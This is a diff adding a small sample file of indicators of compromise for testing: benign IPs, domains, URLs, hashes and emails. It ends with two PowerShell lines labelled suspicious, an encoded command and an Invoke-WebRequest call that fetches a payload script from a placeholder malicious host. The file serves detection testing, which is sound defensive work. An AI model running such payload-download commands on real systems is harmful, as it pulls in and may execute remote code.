@@ -1,0 +1,24 @@
+# Sample IOCs for Testing
+# IP Addresses
+8.8.8.8
+1.1.1.1
+
+# Domains
+google.com
+example.com
+
+# URLs
+https://www.google.com
+http://example.com/test
+
+# File Hashes (MD5)
+5d41402abc4b2a76b9719d911017c592
+098f6bcd4621d373cade4e832627b4f6
+
+# Email
+test@example.com
+admin@test.com
+
+# PowerShell Command (Suspicious)
+powershell -enc SGVsbG8gV29ybGQ=
+Invoke-WebRequest -Uri http://malicious.com/payload.ps1
